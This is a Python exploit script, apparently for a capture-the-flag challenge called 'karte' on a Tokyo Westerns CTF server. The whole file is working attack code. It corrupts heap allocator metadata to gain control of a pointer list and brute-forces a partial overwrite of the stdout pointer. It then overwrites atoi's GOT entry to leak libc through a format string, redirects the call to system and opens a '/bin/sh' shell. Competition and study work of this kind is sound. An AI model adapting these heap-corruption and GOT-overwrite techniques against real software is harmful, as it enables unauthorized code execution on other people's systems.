#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import random

bin_file = './karte'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'karte.chal.ctf.westerns.tokyo', 'port':10001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
addr_plt_printf     = binf.plt['printf']
addr_plt_atoi       = binf.plt['atoi']
addr_got_atoi       = binf.got['atoi']
addr_name           = binf.symbols['name']
addr_list           = binf.symbols['list']
addr_stdout         = binf.symbols['stdout']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']
offset_libc_stdout      = libc.symbols['_IO_2_1_stdout_']

#==========

def attack(conn, **kwargs):
    fake_chunk = [0]*8
    fake_chunk[0] = 0xfffffffffffffff0
    fake_chunk[1] = 0x10;
    fake_chunk[3] = 0x21;
    fake_chunk[7] = 0x1;

    kt = Karte(conn, ''.join(map(p64, fake_chunk))[:-1])

    for _ in range(7):
        x = kt.add(0x18, 'a'*4)
        kt.delete(x)
    for _ in range(7):
        x = kt.add(0x48, 'b'*4)
        kt.delete(x)
    for _ in range(7):
        x = kt.add(0x88, 'c'*4)
        kt.delete(x)

    for _ in range(2):
        huge = kt.add(0xa00000, 'X'*4)
        kt.delete(huge)

    fast1 = kt.add(0x18, '0'*4)
    fast2 = kt.add(0x18, '1'*4)
    small = kt.add(0x88, '2'*4)

    kt.delete(fast2)
    kt.delete(fast1)
    kt.modify(fast1, p64(addr_name + 0x10)[:4])

    kt.delete(small)

    fake_chunk[3] = 0xa00001;
    kt.rename(''.join(map(p64, fake_chunk))[:0x20])
    kt.add(0xa00000, 'Y'*4)

    fake_chunk[3] = 0xfffffffffffffff1;
    kt.rename(''.join(map(p64, fake_chunk))[:0x20])

    kt.add(addr_list - (addr_name+0x10) - 0x20, None)

    exploit  = p32(1)
    exploit += p32(1)   # id : 1
    exploit += p64(addr_stdout)
    exploit += p32(1)
    exploit += p32(2)   # id : 2
    exploit += p64(addr_got_atoi)
    exploit += p64(0)*2
    exploit += p64(0xdeadc0bebeef)
    kt.silent = True
    kt.add(0x38, exploit[:-1])

    cand = range(4, 0xc)
    while cand:
        idx = random.randint(0,len(cand)-1)
        kt.modify(1, p64((offset_libc_stdout & 0xfff) + (cand[idx]<<12))[:2])
        del cand[idx]

        conn.sendlineafter('Done.\n', '100')
        conn.recvuntil('Wrong input.\n')
        if conn.can_recv(0.1):
            break

    kt.silent = False
    kt.modify(2, p64(addr_plt_printf)[:6])
    kt.atoi = False

    conn.sendlineafter('> ', '%19$p ')
    addr_libc_main = int(conn.recvuntil(' ', drop=True), 16) - 0xe7
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    kt.modify(2, p64(addr_plt_atoi+6)[:3])
    kt.atoi = True

    kt.modify(2, p64(addr_libc_system)[:6])
    conn.sendlineafter('> ', '/bin/sh\x00')

class Karte:
    def __init__(self, conn, name):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self._sendafter     = conn.sendafter

        self.atoi = True
        self.silent = False

        self.sendafter('... ', name)

    def sendafter(self, term, s):
        if self.silent:
            sleep(0.1)
            self.send(s)
        else:
            self._sendafter(term, s)

    def sendlineafter(self, term, s):
        self.sendafter(term, s+'\n')

    def add(self, size, data = None):
        self.sendlineafter('> ', '1')
        self.sendlineafter('size > ', str(size) if self.atoi else '%2$0{}d'.format(size))
        if data is not None:
            self.sendafter('description > ', data)
        if not self.silent:
            self.recvuntil('id ')
            return int(self.recvuntil('\n', drop=True))

    def delete(self, idx):
        self.sendlineafter('> ', '3' if self.atoi else '_'*3)
        self.sendlineafter('id > ', str(idx) if self.atoi else '%2$0{}d'.format(idx))

    def modify(self, idx, data):
        self.sendlineafter('> ', '4' if self.atoi else '_'*4)
        self.sendlineafter('id > ', str(idx) if self.atoi else  '%2$0{}d'.format(idx))
        self.sendafter('description > ', data)

    def rename(self, name):
        self.sendlineafter('> ', '99')
        self.sendafter('... ', name)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()

#==========
